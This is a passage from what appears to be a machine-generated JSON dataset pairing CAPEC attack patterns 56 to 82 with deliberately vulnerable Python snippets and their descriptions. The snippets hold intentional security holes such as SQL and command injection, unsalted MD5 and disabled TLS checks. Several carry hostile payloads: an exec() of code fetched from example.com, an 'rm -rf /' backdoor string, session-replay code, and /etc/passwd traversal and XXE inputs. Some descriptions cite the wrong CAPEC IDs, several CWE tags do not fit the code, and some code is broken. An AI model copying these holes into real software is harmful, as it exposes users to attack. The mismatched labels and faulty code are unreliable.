        "code_snippet": "import hashlib\n\ndef store_password(username, password):\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    # Store the username and hashed password in the database\n    db.execute(\"INSERT INTO users (username, password) VALUES (?, ?)\", (username, hashed_password))\n\n\ndef authenticate(username, password):\n    stored_hash = db.execute(\"SELECT password FROM users WHERE username = ?\", (username,)).fetchone()[0]\n    if hashlib.md5(password.encode()).hexdigest() == stored_hash:\n        return True\n    return False\n\n# Example usage\nstore_password(\"user1\", \"weakpassword\")\nprint(authenticate(\"user1\", \"weakpassword\"))  # Returns: True",
        "description": "This code snippet demonstrates a vulnerable password storage and authentication system. It uses a weak hashing algorithm (MD5) with no salt, no password aging, and no strong password requirements. The authenticate function uses single-factor authentication and relies on a single condition (hash equality) to grant access. An attacker can use a rainbow table to crack the stored hashes and gain unauthorized access to the system."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-602: Client-Side Enforcement of Server-Side Security\n    # The client is responsible for hashing the password\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    # CWE-294: Authentication Bypass by Capture-replay\n    # The client sends the hashed password to the server\n    return send_to_server(username, hashed_password)\n\n# CWE-693: Protection Mechanism Failure\n# The server does not verify the authenticity of the request\n# CWE-592: DEPRECATED: Authentication Bypass Issues\n# The server does not check for replay attacks\ndef send_to_server(username, hashed_password):\n    # CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n    # The compiler may optimize away security-critical code\n    if username == 'admin' and hashed_password == 'hashed_admin_password':\n        return 'Access granted'\n    else:\n        return 'Access denied'",
        "description": "This code snippet demonstrates a vulnerable authentication system that relies on the client to hash the password and send it to the server. The server does not verify the authenticity of the request and does not check for replay attacks, making it vulnerable to authentication bypass. The compiler may also optimize away security-critical code, further weakening the system."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import requests\n\n# CWE-287: Improper Authentication\n# No authentication mechanism is implemented to verify the identity of the user\n\nusername = 'admin'\npassword = 'password'\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\n# Sensitive information (username and password) is included in the query string\nurl = 'https://example.com/login?username=' + username + '&password=' + password\n\n# CWE-642: External Control of Critical State Data\n# Security-critical state information (user credentials) is stored in an accessible location\n\nresponse = requests.get(url, verify=False)\n\n# CWE-693: Protection Mechanism Failure\n# No SSL/TLS verification is performed, allowing for man-in-the-middle attacks\n\nif response.status_code == 200:\n    print('Login successful')\nelse:\n    print('Login failed')",
        "description": "This Python code snippet demonstrates a REST-style application that is vulnerable to a man-in-the-middle attack. It lacks proper authentication, sends sensitive information in the query string, and fails to verify the SSL/TLS certificate, allowing an attacker to intercept and access sensitive data."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n# Define a resource that can be accessed without authentication\nresource = {'data': 'sensitive_data'}\n\n# Define a function to handle GET requests that modifies the resource\n@app.route('/resource', methods=['GET'])\ndef get_resource():\n    # No authentication or authorization check\n    resource['data'] = request.args.get('new_data')\n    return {'message': 'Resource updated successfully'}\n\n# Define a function to handle DELETE requests that deletes the resource\n@app.route('/resource', methods=['DELETE'])\ndef delete_resource():\n    # No authentication or authorization check\n    global resource\n    resource = None\n    return {'message': 'Resource deleted successfully'}\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates a RESTful API that lacks proper access control mechanisms, allowing an adversary to perform malicious actions such as modifying or deleting sensitive data without authentication or authorization checks. The API uses Flask and defines two endpoints: one for GET requests that modifies the resource, and one for DELETE requests that deletes the resource. Both functions do not perform any authentication or authorization checks, making it vulnerable to attacks."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import random\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        # CWE-330: Insufficiently random session ID\n        session_id = str(random.randint(1, 1000))\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def authenticate(self, session_id):\n        # CWE-290: Authentication Bypass by Spoofing\n        if session_id in self.sessions:\n            return True\n        return False\n\n    def get_user_id(self, session_id):\n        # CWE-488: Exposure of Data Element to Wrong Session\n        return self.sessions.get(session_id, None)\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\ncookies = {'session_id': '123'}\n\nsession_manager = SessionManager()\nuser_id = session_manager.get_user_id(cookies['session_id'])\nif user_id:\n    print(f'Authenticated as user {user_id}')\nelse:\n    print('Authentication failed')",
        "description": "This code snippet demonstrates a vulnerable session management system that uses predictable session IDs, allowing an attacker to spoof and hijack sessions. The session ID is generated using a weak random number generator, making it predictable. The authenticate method does not properly verify the session ID, and the get_user_id method exposes sensitive information to the wrong session. Additionally, the code uses persistent cookies containing sensitive information, making it vulnerable to session fixation attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import requests\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-290: Authentication Bypass by Spoofing\n\n# Stolen session ID\nstolen_session_id = 'session_id_from_previous_transaction'\n\n# CWE-346: Origin Validation Error\n# No validation of the source of the request\nurl = 'https://example.com/protected_resource'\nheaders = {'Cookie': 'session_id=' + stolen_session_id}\n\n# CWE-384: Session Fixation\n# No invalidation of existing session identifier\nresponse = requests.get(url, headers=headers)\n\n# CWE-488: Exposure of Data Element to Wrong Session\n# Data is provided to the wrong session\nif response.status_code == 200:\n    print('Session hijacked successfully!')\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# Persistent cookie containing sensitive information\ncookie = {'session_id': stolen_session_id, 'user_data': 'sensitive_data'}\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Sensitive information exposed to unauthorized actor\nprint('Sensitive data:', cookie['user_data'])\n\n# CWE-285: Improper Authorization\n# No authorization check for accessing the resource\n# CWE-664: Improper Control of a Resource Through its Lifetime\n# No control over the resource throughout its lifetime\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Incorrect permission assignment for critical resource\n",
        "description": "This code snippet demonstrates a session replay attack, where an attacker reuses a stolen session ID to spoof the target system and gain privileges. The code bypasses authentication by replaying the stolen session ID, exposing sensitive information to unauthorized actors, and violating proper authorization and resource control."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n# CWE-384: Session Fixation\n@app.before_request\ndef set_session_id():\n    if 'session_id' not in flask.session:\n        flask.session['session_id'] = flask.request.args.get('session_id')\n\n# CWE-664: Improper Control of a Resource Through its Lifetime\n@app.route('/login', methods=['POST'])\ndef login():\n    username = flask.request.form['username']\n    password = flask.request.form['password']\n    if authenticate(username, password):\n        # CWE-732: Incorrect Permission Assignment for Critical Resource\n        flask.session['privileges'] = 'admin'\n        return 'Login successful'\n    return 'Invalid credentials'\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if flask.session.get('privileges') == 'admin':\n        return 'Welcome to admin panel'\n    return 'Access denied'\n\n# CWE-1270: Generation of Incorrect Security Tokens\n@app.route('/generate_token', methods=['GET'])\ndef generate_token():\n    token = flask.session['session_id'] + 'admin_token'\n    return token\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet demonstrates the CAPEC of Session Fixation. The code allows an attacker to set the session ID through a GET parameter, which is then used to authenticate the user. After authentication, the session ID remains the same, allowing the attacker to use the privileged session ID in their own transactions. The code also includes CWE-664, CWE-732, CWE-602, and CWE-1270, which contribute to the vulnerability."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import requests\n\n# CWE-306: Missing Authentication for Critical Function\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n\n# Assume 'session_cookie' is set after user authentication\nsession_cookie = {'session_id': '1234567890'}\n\n# CWE-664: Improper Control of a Resource Through its Lifetime\n# CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n# Malicious link crafted to exploit CSRF vulnerability (CWE-352)\nmalicious_link = 'https://example.com/delete_account?session_id=1234567890'\n\n# Send a malicious request to the vulnerable application\nresponse = requests.get(malicious_link, cookies=session_cookie, headers={'Origin': 'https://example.com'})\n\nprint(response.status_code)",
        "description": "This Python code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack, leveraging missing authentication, incorrect permission assignment, and improper control of resources. It crafts a malicious link that, when clicked, will delete the user's account without their knowledge or consent, using the existing session cookie."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/comment', methods=['POST'])\ndef add_comment():\n    username = request.form['username']\n    comment = request.form['comment']\n    html = '<div><h2>{}</h2><p>{}</p></div>'.format(username, comment)\n    return html\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This code snippet is vulnerable to Cross-Site Scripting (XSS) due to improper neutralization of input during web page generation (CWE-79). The add_comment function takes user input from the request form and inserts it into an HTML template without proper validation or sanitization, allowing an attacker to inject malicious scripts. The code also lacks input validation (CWE-20), making it susceptible to various types of attacks. Additionally, the code does not implement a complete denylist to prevent XSS attacks (CWE-692), and it does not properly neutralize scripts in attributes of IMG tags (CWE-82) or error message web pages (CWE-81)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef vulnerable_url_parser(url):\n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    decoded_url = urllib.parse.unquote(url)\n    \n    # CWE-73: External Control of File Name or Path\n    # CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n    path_components = decoded_url.split('/')\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-20: Improper Input Validation\n    restricted_dir = '/restricted'\n    if path_components[0] == restricted_dir:\n        # CWE-697: Incorrect Comparison\n        # CWE-707: Improper Neutralization\n        return 'Access granted'\n    else:\n        return 'Access denied'\n\nurl = '%2e%2e%2frestricted%2fconfidential%2fdata.txt'\nprint(vulnerable_url_parser(url))",
        "description": "This Python code snippet demonstrates a vulnerable URL parser that is susceptible to URL encoding attacks. It fails to properly handle URL encoding, alternate encoding, and encoding errors, allowing an attacker to craft a malicious URL that bypasses access restrictions."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import requests\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Downloading code from a remote location without integrity check (CWE-494)\ndata = requests.get('http://example.com/code_to_download.py').text\n\n# Storing sensitive information in cleartext (CWE-318)\nsensitive_info = 'password=123456'\n\n# Transmitting sensitive information in cleartext (CWE-319)\nrequests.post('http://example.com/authenticate', data={'username': 'user', 'password': '123456'})\n\n# Executing downloaded code without verification (CWE-494)\nexec(data)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary passively sniffing network communications and capturing application code bound for an authorized client. It downloads code from a remote location without verifying its integrity, stores sensitive information in cleartext, transmits sensitive information in cleartext, and executes the downloaded code without verification."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "import sqlite3\n\ndef get_user(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    cursor.execute(query)\n    user = cursor.fetchone()\n    return user\n\nusername = input(\"Enter your username: \")\nuser = get_user(username)\nif user:\n    print(\"Welcome, \" + user[1])\nelse:\n    print(\"User not found\")",
        "description": "This Python code snippet is vulnerable to SQL Injection (CWE-89) as it constructs an SQL query using user input without proper validation or sanitization. An attacker can inject malicious SQL code as the username, allowing them to access unauthorized data or even execute arbitrary SQL commands. The code also lacks proper error handling, potentially leading to sensitive information disclosure (CWE-209). Additionally, the database cursor is not properly closed, leaving it dangling (CWE-619)."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "import syslog\n\ndef vulnerable_function(user_input):\n    syslog.syslog(user_input)\n\nuser_input = '%s' * 10000\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a format string injection vulnerability in the syslog function. The vulnerable_function takes user input and passes it directly to the syslog function without proper validation or sanitization, allowing an attacker to inject malicious format string commands, potentially leading to a buffer overflow."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "import hashlib\n\ndef generate_weak_hash(data):\n    # CWE-328: Using a weak hash algorithm (MD5)\n    return hashlib.md5(data.encode()).hexdigest()\n\n\ndef sign_code(code, private_key):\n    # CWE-325: Missing cryptographic step (not using a secure padding scheme)\n    return private_key.sign(code.encode(), hashfunc=generate_weak_hash)\n\n\ndef verify_code_signature(code, signature, public_key):\n    # CWE-733: Compiler optimization removal of security-critical code (disabled signature verification)\n    if False:\n        public_key.verify(signature, code.encode(), padding=None, hashfunc=generate_weak_hash)\n    return True\n\n\n# CWE-506: Embedded malicious code (backdoor)\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\n\n\n# CWE-1326: Missing immutable root of trust in hardware (assuming a compromised boot process)\nboot_process = 'malicious_boot_code'\n\n\n# CAPEC: Subverting code signing mechanism\nsigned_code = sign_code(malicious_code, 'private_key')\nprint('Signed malicious code:', signed_code)\n\n\n# Verifying the malicious code signature (which will always pass due to the disabled verification)\nprint('Verified signature:', verify_code_signature(malicious_code, signed_code, 'public_key'))",
        "description": "This code snippet demonstrates a vulnerable code signing mechanism that can be subverted by an attacker. It uses a weak hash algorithm (MD5), misses a cryptographic step (secure padding scheme), and has a disabled signature verification. Additionally, it contains embedded malicious code and assumes a compromised boot process. The code signing mechanism can be bypassed, allowing an attacker to execute malicious code with elevated privileges."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\n\ndef run_command_with_elevated_privileges(command):\n    try:\n        # CWE-250: Running with unnecessary privileges\n        # CWE-15: External control of system or configuration setting\n        os.system(command)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# CWE-114: Process control - executing commands from an untrusted source\n# CWE-506: Embedded malicious code\n# CWE-78: OS command injection\nmalicious_command = input(\"Enter a command to run: \")\nrun_command_with_elevated_privileges(malicious_command)",
        "description": "This code snippet demonstrates the CAPEC of targeting programs running with elevated privileges. It defines a function that runs a system command with elevated privileges, which can be exploited by an attacker to execute arbitrary code. The function takes a command as input, which can be controlled by an external user (CWE-15). The code then executes the command using os.system(), which can lead to OS command injection (CWE-78) and process control vulnerabilities (CWE-114). The code also contains embedded malicious code (CWE-506) that can be exploited by an attacker. The function runs with unnecessary privileges (CWE-250), amplifying the consequences of other weaknesses."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "import getpass\n\n# Hard-coded credentials (CWE-798)\nusername = 'admin'\npassword = 'password123'\n\n# Weak password requirements (CWE-521)\ndef validate_password(password):\n    if len(password) < 8:\n        return True\n    else:\n        return False\n\n# Single-factor authentication (CWE-308)\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n# No password aging mechanism (CWE-262)\ndef check_password_expiration(password):\n    return True\n\n# Reliance on a single factor in a security decision (CWE-654)\ndef grant_access(username, password):\n    if authenticate(username, password):\n        return True\n    else:\n        return False\n\n# Main program\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\nif grant_access(username, password):\n    print('Access granted!')\nelse:\n    print('Access denied!')",
        "description": "This Python code snippet demonstrates a vulnerable authentication system that embodies the main idea of the CAPEC. It uses hard-coded credentials, has weak password requirements, relies on single-factor authentication, lacks a password aging mechanism, and relies on a single factor in a security decision. An attacker can easily gain access to the system by using the default credentials or by using a brute-force attack to guess the password."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef validate_input(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-176: Improper Handling of Unicode Encoding\n    if not isinstance(user_input, str):\n        return False\n    \n    # CWE-179: Incorrect Behavior Order: Early Validation\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    user_input = urllib.parse.unquote(user_input)\n    \n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    if '%' in user_input:\n        return False\n    \n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-183: Permissive List of Allowed Inputs\n    disallowed_chars = ['<', '>', ';', '=']\n    for char in disallowed_chars:\n        if char in user_input:\n            return False\n    \n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-697: Incorrect Comparison\n    if user_input.lower() == 'allowed_input':\n        return True\n    \n    return False\n\n# CWE-692: Incomplete Denylist to Cross-Site Scripting\nallowed_inputs = ['allowed_input', 'another_allowed_input']\nuser_input = '<script>alert(1)</script>'\nif user_input not in allowed_inputs:\n    print('Input is not allowed')\nelse:\n    print('Input is allowed')",
        "description": "This code snippet demonstrates a vulnerable input validation mechanism that can be bypassed using Unicode encoding and alternate encoding. The code first checks if the input is a string, then unquotes the input using urllib.parse.unquote. It then checks for disallowed characters and finally compares the input to a list of allowed inputs. However, the list of disallowed characters and allowed inputs is incomplete, allowing an attacker to bypass the validation mechanism."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "import urllib.parse\n\n\ndef vulnerable_function(url):\n    # CWE-20: Improper Input Validation\n    # No validation on the input URL\n    parsed_url = urllib.parse.urlparse(url)\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-177: Improper Handling of URL Encoding (Hex Encoding)\n    # CWE-172: Encoding Error\n    # No proper handling of URL encoding\n    path = urllib.parse.unquote(parsed_url.path)\n    # CWE-73: External Control of File Name or Path\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # No sanitization of the path\n    file_path = \"/var/www/html/\" + path\n    return file_path\n\nurl = \"http://example.com/../../../../etc/passwd\"\nprint(vulnerable_function(url))",
        "description": "This Python code snippet demonstrates a vulnerable function that takes a URL as input and returns a file path. It lacks proper input validation, encoding handling, and sanitization, making it vulnerable to URL encoding attacks."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "import os\n\ndef generate_html(filename):\n    html = '<a href=\"' + filename + '\">Click here</a>'\n    return html\n\nfilename = input('Enter a filename: ')\n\nif '.' in filename:\n    filename = filename.replace('.', '_')\n\nhtml = generate_html(filename)\n\nwith open('user_generated.html', 'w') as f:\n    f.write(html)\n\nprint('HTML file generated successfully!')",
        "description": "This code snippet demonstrates a vulnerability to CAPEC-11, where an attacker can inject malicious characters into a filename, which is then used to generate HTML content. The code does not properly validate the input filename, allowing an attacker to inject XSS payloads. The CWEs embodied in this code snippet include CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), CWE-96 (Improper Neutralization of Directives in Statically Saved Code), CWE-116 (Improper Encoding or Escaping of Output), and CWE-697 (Incorrect Comparison)."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "import hashlib\n\nclass ShoppingCart:\n    def __init__(self):\n        self.items = {}\n        self.state = 'active'\n\n    def add_item(self, item, quantity):\n        if self.state != 'active':\n            return False\n        self.items[item] = quantity\n        return True\n\n    def checkout(self):\n        if self.state != 'active':\n            return False\n        # Incomplete internal state distinction (CWE-372)\n        self.state = 'inactive'\n        return True\n\n    def save_cart(self):\n        # Cleartext storage of sensitive information in a cookie (CWE-315)\n        cookie = {'items': self.items, 'state': self.state}\n        return cookie\n\n    def load_cart(self, cookie):\n        # Missing support for integrity check (CWE-353)\n        self.items = cookie['items']\n        self.state = cookie['state']\n        return True\n\n    def reset_cart(self):\n        # Protection mechanism failure (CWE-693)\n        self.items = {}\n        # Uninitialized value on reset for registers holding security settings (CWE-1271)\n        self.state = 'active'\n        return True\n\n# Improper finite state machines (FSMs) in hardware logic (CWE-1245)\n# Incorrect selection of fuse values (CWE-1253)\n# Unintended reentrant invocation of non-reentrant code via nested calls (CWE-1265)\n\n# Example usage:\n\nshopping_cart = ShoppingCart()\nshopping_cart.add_item('apple', 2)\nshopping_cart.add_item('banana', 3)\ncookie = shopping_cart.save_cart()\nshopping_cart.load_cart(cookie)\nshopping_cart.checkout()\nshopping_cart.reset_cart()",
        "description": "This code snippet demonstrates the CAPEC of modifying state information maintained by the target software. The ShoppingCart class has an internal state that can be modified by an adversary to elevate privileges, conduct fraudulent transactions, or otherwise modify the flow of the application. The code includes CWEs such as incomplete internal state distinction, cleartext storage of sensitive information in a cookie, missing support for integrity check, protection mechanism failure, and uninitialized value on reset for registers holding security settings. The example usage shows how an adversary can manipulate the state of the shopping cart to gain unauthorized access or disrupt the application."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n# CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n# CWE-346: Origin Validation Error\n# CWE-353: Missing Support for Integrity Check\n# CWE-354: Improper Validation of Integrity Check Value\n\ndef execute_command(user_input):\n    # No validation or sanitization of user input\n    command = 'git pull ' + user_input + ' && make all'\n    subprocess.call(command, shell=True)\n\n# CWE-349: Untrusted data is accepted and treated as trusted\n# CWE-99: Untrusted data is used as a resource identifier\n# CWE-77: Special elements in the command are not neutralized\n# CWE-346: No origin validation of the user input\n# CWE-353: No integrity check of the data transmission\n# CWE-354: No validation of the integrity check value\n\nuser_input = 'https://example.com/malicious.git'\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying manually edited files that are not in the preview of system administrators, giving unauthorized access to the application. The code accepts user input and uses it to construct a command that is executed using the subprocess module. The input is not validated or sanitized, allowing an attacker to inject malicious commands or data. The code also lacks origin validation, integrity checks, and validation of integrity check values, making it vulnerable to various attacks."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    return open(file_path, 'r').read()\n\nfile_path = input('Enter the file path: ')\nprint(read_file(file_path))",
        "description": "This Python code snippet is vulnerable to path traversal attacks. It takes user input for a file path and attempts to read the file. An attacker can manipulate the input to access files outside of the intended directory by using sequences such as '..' or './' to traverse the file system. This is an example of CWE-23 (Relative Path Traversal) and CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), which are related to the CAPEC of manipulating inputs to access unintended areas of the file system."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "import os\n\ndef get_user_data():\n    user_id = os.environ.get('USER_ID')\n    if user_id:\n        return {'user_id': user_id, 'is_admin': os.environ.get('IS_ADMIN', False)}\n    else:\n        return {'user_id': 'guest', 'is_admin': False}\n\n\ndef access_sensitive_data(user_data):\n    if user_data['is_admin']:\n        return 'Sensitive data: *** Classified Information ***'\n    else:\n        return 'Access denied'\n\n\nuser_data = get_user_data()\nprint(access_sensitive_data(user_data))",
        "description": "This Python code snippet demonstrates the CAPEC, where an adversary can override variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. The code uses environment variables to store user data, including the user ID and admin status, which can be easily manipulated by an attacker. The get_user_data function retrieves the user data from the environment variables, and the access_sensitive_data function uses this data to determine whether to grant access to sensitive information. An attacker can bypass authentication by setting the IS_ADMIN environment variable to True, allowing them to access sensitive data."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef validate_input(input_path):\n    if os.path.exists(input_path):\n        return True\n    else:\n        return False\n\n\ndef canonicalize_path(input_path):\n    return input_path.replace('\\\\', '/')\n\n\ndef filter_path(input_path):\n    if '..' in input_path:\n        return False\n    else:\n        return True\n\n\ninput_path = 'C:\\temp\\\\..\\\\windows\\\\win.ini'\n\nif validate_input(input_path):\n    canonicalized_path = canonicalize_path(input_path)\n    if filter_path(canonicalized_path):\n        print('Path is valid and safe to use')\n    else:\n        print('Path is not safe to use')\nelse:\n    print('Path does not exist')",
        "description": "This code snippet demonstrates the CAPEC of using alternate encoding to bypass security filters. The code first validates the input path, then canonicalizes it, and finally filters it. However, the canonicalization step can be exploited by providing a path with double backslashes, which are replaced with a single forward slash. This can lead to a path traversal vulnerability, allowing an attacker to access sensitive files. The code also violates CWE-180 by validating the input before canonicalizing it, and CWE-181 by validating the input before filtering it. Additionally, it violates CWE-173 by not properly handling alternate encoding, CWE-172 by not properly encoding the path, CWE-73 by allowing user input to control the file path, CWE-22 by not properly neutralizing special elements in the path, CWE-74 by not neutralizing special elements in the output, CWE-20 by not properly validating the input, CWE-697 by not comparing the input correctly, and CWE-707 by not ensuring the structured message is well-formed."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-73: External Control of File Name or Path\n    path = os.path.join('/var/www/html', user_input)\n    if os.path.exists(path):\n        # CWE-185: Incorrect Regular Expression\n        if re.match(r'^[a-zA-Z0-9_\\-\\/]+$', path):\n            # CWE-707: Improper Neutralization\n            return open(path, 'r').read()\n    return 'File not found'\n\n# CWE-173: Improper Handling of Alternate Encoding\nuser_input = '....//etc/passwd'  # or '\\\\\\\\..\\\\\\\\..\\\\\\\\etc\\\\\\\\passwd'\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates the CAPEC-63 attack pattern, which targets the encoding of Slash characters. The vulnerable_function takes user input and constructs a path using os.path.join. The function then checks if the path exists and applies a regular expression to validate the path. However, the regular expression is incorrect, and the function does not properly handle alternate encoding of slashes. An adversary can exploit this by providing a specially crafted input that traverses to a sensitive file, such as /etc/passwd."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import urllib.parse\n\ndef validate_input(input_string):\n    # CWE-20: Improper Input Validation\n    # CWE-173: Improper Handling of Alternate Encoding\n    if len(input_string) > 100:\n        return False\n    # CWE-172: Encoding Error\n    try:\n        input_string.encode('utf-8')\n    except UnicodeEncodeError:\n        return False\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    canonicalized_input = urllib.parse.unquote(input_string)\n    if canonicalized_input != input_string:\n        return False\n    # CWE-73: External Control of File Name or Path\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    if '..' in canonicalized_input or '/' in canonicalized_input:\n        return False\n    # CWE-697: Incorrect Comparison\n    if canonicalized_input != input_string.encode('utf-8').decode('utf-8'):\n        return False\n    return True\n\ninput_string = \"\\xc2\\xa0<script>alert(1)</script>\"\nif validate_input(input_string):\n    print(\"Input is valid\")\nelse:\n    print(\"Input is not valid\")",
        "description": "This code snippet demonstrates the CAPEC attack by leveraging alternate encodings to bypass validation logic. It uses various CWEs to illustrate the vulnerabilities, including improper input validation, encoding errors, incorrect behavior order, and external control of file name or path. The code attempts to validate user input using UTF-8 encoding, but it can be bypassed using overlong characters or other encoding tricks. The input string is a malicious script that can be injected into the application."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\n\n# CWE-20: Improper Input Validation\n# CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)\n# CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')\n# CWE-116: Improper Encoding or Escaping of Output\n# CWE-117: Improper Output Neutralization for Logs\n\nlog_data = input('Enter log data: ')\n\n# CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\nlog_data = log_data.replace('\\n', '')\n\n# CWE-221: Information Loss or Omission\nlogging.basicConfig(filename='log.txt', level=logging.INFO)\n\n# CWE-276: Incorrect Default Permissions\n# CWE-279: Incorrect Execution-Assigned Permissions\nwith open('log.txt', 'a') as f:\n    f.write(log_data + '\\n')\n\n# CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\nlogging.info(log_data)\n",
        "description": "This Python code snippet demonstrates a vulnerable logging mechanism that is susceptible to web logs tampering attacks. It lacks proper input validation, allowing an attacker to inject malicious data into the log file. The code also fails to properly encode or escape output, making it vulnerable to CRLF injection and other special element injection attacks. Furthermore, the code uses default permissions that allow anyone to modify the log file, and it does not properly record security-relevant information, leading to potential information loss or omission."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_data):\n    try:\n        root = ET.fromstring(xml_data)\n        # No XML validation against a proper schema\n        # No neutralization of special elements\n        # No restriction of XML external entity references\n        # No control over recursive entity references in DTDs\n        for elem in root.iter():\n            if elem.tag == 'entity':\n                # Potential XML entity expansion\n                elem.text = elem.text + ' EXPANDED'\n        return ET.tostring(root, encoding='unicode')\n    except ET.ParseError:\n        return 'Error parsing XML'\n\nxml_data = '<!DOCTYPE foo [<!ENTITY xxe \"file:///etc/passwd\">]><foo>&xxe;</foo>'\nprint(process_xml(xml_data))",
